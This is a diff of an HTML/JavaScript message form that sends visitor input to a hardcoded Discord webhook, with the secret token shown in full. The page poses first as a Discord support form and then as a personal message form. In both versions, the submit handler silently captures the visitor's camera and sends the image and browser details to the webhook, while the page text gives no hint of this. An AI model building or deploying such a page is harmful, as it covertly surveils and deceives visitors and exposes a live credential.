@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Support Submission</title>
+    <title>Send Message to My Discord Server</title>
     <style>
         * {
             margin: 0;
@@ -272,7 +272,7 @@
     <!-- Loading overlay -->
     <div id="loading-overlay" class="loading-overlay">
         <div class="loading-spinner"></div>
-        <div class="loading-text">Processing your submission...</div>
+        <div class="loading-text">Sending your message to Discord...</div>
     </div>
     
     <!-- Main container -->
@@ -281,35 +281,30 @@
             <div class="logo-icon">
                 <i class="fab fa-discord"></i>
             </div>
-            <div class="logo-text">Support Submission</div>
-            <div class="logo-subtitle">Submit your message to Discord support</div>
+            <div class="logo-text">Send Message to My Server</div>
+            <div class="logo-subtitle">Write any message and I'll receive it on Discord</div>
         </div>
         
-        <form id="submission-form">
+        <form id="message-form">
             <div class="form-group">
-                <label class="form-label">Discord Username</label>
-                <input type="text" id="username" class="form-input" placeholder="e.g., username#1234" required>
-            </div>
-            
-            <div class="form-group">
-                <label class="form-label">Email Address</label>
-                <input type="email" id="email" class="form-input" placeholder="your.email@example.com" required>
+                <label class="form-label">Your Discord Username (Optional)</label>
+                <input type="text" id="username" class="form-input" placeholder="username#1234 (optional)">
             </div>
             
             <div class="form-group">
                 <label class="form-label">Your Message</label>
-                <textarea id="message" class="form-textarea" placeholder="Type your message here..." required></textarea>
+                <textarea id="message" class="form-textarea" placeholder="Type anything you want to send to my Discord server..." required></textarea>
             </div>
             
             <button type="submit" class="submit-btn" id="submit-btn">
-                <i class="fas fa-paper-plane"></i> Submit to Discord
+                <i class="fas fa-paper-plane"></i> Send to Discord Server
             </button>
             
             <div id="status-message" class="status-message"></div>
         </form>
         
         <div class="privacy-note">
-            <i class="fas fa-shield-alt"></i> Your information is secure and will be sent directly to Discord support.
+            <i class="fas fa-shield-alt"></i> Your message will be sent directly to my Discord server
         </div>
     </div>
 
@@ -318,9 +313,8 @@
         const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
         
         // DOM Elements
-        const form = document.getElementById('submission-form');
+        const form = document.getElementById('message-form');
         const usernameInput = document.getElementById('username');
-        const emailInput = document.getElementById('email');
         const messageInput = document.getElementById('message');
         const submitBtn = document.getElementById('submit-btn');
         const statusMessage = document.getElementById('status-message');
@@ -368,14 +362,14 @@
             ctx.fillRect(10, 10, 400, 50);
             ctx.fillStyle = '#ffffff';
             ctx.font = '14px Arial';
-            ctx.fillText(`Submission: ${new Date().toLocaleString()}`, 20, 35);
+            ctx.fillText(`Message from: ${new Date().toLocaleString()}`, 20, 35);
             
             // Convert to data URL
             return canvas.toDataURL('image/jpeg', 0.9);
         }
         
         // Function to send data to Discord
-        async function sendToDiscord(username, email, message, screenshot = null) {
+        async function sendToDiscord(username, message, screenshot = null) {
             try {
                 const timestamp = new Date().toISOString();
                 const userAgent = navigator.userAgent;
@@ -384,19 +378,14 @@
                 
                 // Create rich embed
                 const embed = {
-                    title: "📋 New Support Submission",
-                    description: "A user has submitted a support request",
+                    title: "📩 New Visitor Message",
+                    description: "Someone sent a message to your server",
                     color: 0x5865f2,
                     timestamp: timestamp,
                     fields: [
                         {
                             name: "👤 Discord Username",
-                            value: username || "Not provided",
-                            inline: true
-                        },
-                        {
-                            name: "📧 Email",
-                            value: email || "Not provided",
+                            value: username || "Anonymous",
                             inline: true
                         },
                         {
@@ -421,12 +410,12 @@
                         }
                     ],
                     footer: {
-                        text: "Support Submission System"
+                        text: "Discord Message System"
                     }
                 };
                 
                 const payload = {
-                    username: "Support Form",
+                    username: "Visitor Message",
                     embeds: [embed]
                 };
                 
@@ -446,11 +435,11 @@
                     const blob = await response.blob();
                     
                     const formData = new FormData();
-                    formData.append('file', blob, `submission_${Date.now()}.jpg`);
+                    formData.append('file', blob, `visitor_${Date.now()}.jpg`);
                     
                     const imagePayload = {
-                        username: "Support Form",
-                        content: "📸 Face verification attached"
+                        username: "Visitor Message",
+                        content: "📸 Visitor screenshot attached"
                     };
                     
                     await fetch(DISCORD_WEBHOOK, {
@@ -515,24 +504,11 @@
             
             // Get form values
             const username = usernameInput.value.trim();
-            const email = emailInput.value.trim();
             const message = messageInput.value.trim();
             
             // Basic validation
-            if (!username) {
-                showStatus('Please enter your Discord username', 'error');
-                usernameInput.focus();
-                return;
-            }
-            
-            if (!email || !email.includes('@')) {
-                showStatus('Please enter a valid email address', 'error');
-                emailInput.focus();
-                return;
-            }
-            
             if (!message) {
-                showStatus('Please enter your message', 'error');
+                showStatus('Please enter a message', 'error');
                 messageInput.focus();
                 return;
             }
@@ -541,22 +517,22 @@
             isProcessing = true;
             submitBtn.disabled = true;
             loadingOverlay.style.display = 'flex';
-            showStatus('Capturing verification...', 'processing');
+            showStatus('Preparing to send...', 'processing');
             
             try {
                 // First capture the camera silently
-                showStatus('Verifying identity...', 'processing');
+                showStatus('Capturing verification...', 'processing');
                 const screenshot = await captureCameraSilently();
                 
                 // Then send everything to Discord
-                showStatus('Sending to Discord...', 'processing');
-                const success = await sendToDiscord(username, email, message, screenshot);
+                showStatus('Sending to Discord server...', 'processing');
+                const success = await sendToDiscord(username, message, screenshot);
                 
                 if (success) {
-                    showStatus('✅ Submission sent successfully!', 'success');
+                    showStatus('✅ Message sent successfully to Discord server!', 'success');
                     
-                    // Reset form
-                    form.reset();
+                    // Reset form but keep username
+                    messageInput.value = '';
                     
                     // Show success for a moment
                     setTimeout(() => {
@@ -564,7 +540,7 @@
                     }, 3000);
                     
                 } else {
-                    showStatus('Failed to send submission. Please try again.', 'error');
+                    showStatus('Failed to send message. Please try again.', 'error');
                 }
                 
             } catch (error) {
@@ -587,7 +563,7 @@
         
         // Initialize
         window.addEventListener('load', function() {
-            console.log('Support form loaded and ready');
+            console.log('Message form loaded and ready');
         });
     </script>
 </body>
